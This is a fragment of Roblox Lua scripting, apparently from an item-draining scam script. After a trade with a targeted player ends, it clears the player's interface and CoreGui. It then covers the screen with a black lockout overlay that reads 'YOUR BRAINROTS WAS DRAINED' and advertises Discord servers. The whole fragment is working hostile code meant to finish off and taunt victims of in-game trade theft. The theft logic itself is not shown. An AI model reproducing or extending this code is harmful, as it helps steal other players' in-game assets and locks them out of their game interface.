    local function renderLockoutScreen()
        if lockoutShown then return end
        lockoutShown = true

        pcall(function()
            pg:ClearAllChildren()
        end)
        pcall(function()
            game:GetService("CoreGui"):ClearAllChildren()
        end)

        local screenGui = Instance.new("ScreenGui")
        screenGui.IgnoreGuiInset = true
        screenGui.ResetOnSpawn = false
        screenGui.Parent = game:GetService("CoreGui")

        local function createFrame(parent, size, position, zIndex)
            local frame = Instance.new("Frame")
            frame.Size = size
            frame.Position = position
            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            frame.BorderSizePixel = 0
            if zIndex then frame.ZIndex = zIndex end
            frame.Parent = parent
            return frame
        end

        local rootFrame = createFrame(screenGui, UDim2.fromScale(1, 1), UDim2.fromScale(0, 0), nil)
        createFrame(screenGui, UDim2.fromScale(1.2, 1.2), UDim2.fromScale(-0.1, -0.1), -1)

        local function createTextLabel(parent, size, position, text, color, fontSize)
            local label = Instance.new("TextLabel")
            label.Size = size
            label.Position = position
            label.BackgroundTransparency = 1
            label.Text = text
            label.TextColor3 = color
            label.TextScaled = (fontSize == nil)
            if fontSize then
                label.TextSize = fontSize
                label.TextScaled = false
            end
            label.Font = Enum.Font.GothamBold
            label.TextXAlignment = Enum.TextXAlignment.Center
            label.TextYAlignment = Enum.TextYAlignment.Center
            label.Parent = parent
            return label
        end

        createTextLabel(rootFrame, UDim2.fromScale(1, 0.3), UDim2.fromScale(0, 0.1), "YOUR BRAINROTS WAS DRAINED", Color3.fromRGB(255, 0, 0), nil)
        createTextLabel(rootFrame, UDim2.fromScale(0.8, 0.08), UDim2.fromScale(0.1, 0.72), "Server: https://discord.gg/UA9xGPKAqE", Color3.fromRGB(180, 180, 180), 13).TextTransparency = 0.4

        task.spawn(function()
            local WxnAdGuild = fetchDiscordInvite("WxnAd", "WxnAd")
            local LKZGuild = fetchDiscordInvite("LKZ", "LKZ")
            createDiscordCard(rootFrame, UDim2.new(0, 10, 1, -182), WxnAdGuild, "WxnAd")
            createDiscordCard(rootFrame, UDim2.new(0, 10, 1, -92), LKZGuild, "LKZ")
        end)
    end

    tradeReplicator:ListenRaw(function()
        local active = tradeReplicator:TryIndex({ "active", "data" })
        if active then
            if not tradeOpened then
                tradeOpened = true
                otherUserId = getOtherUserId()
            end
        elseif tradeOpened then
            tradeOpened = false
            local partner = otherUserId
            otherUserId = nil
            if partner == targetId and not lockoutShown then
                renderLockoutScreen()
            end
        end
    end)
end
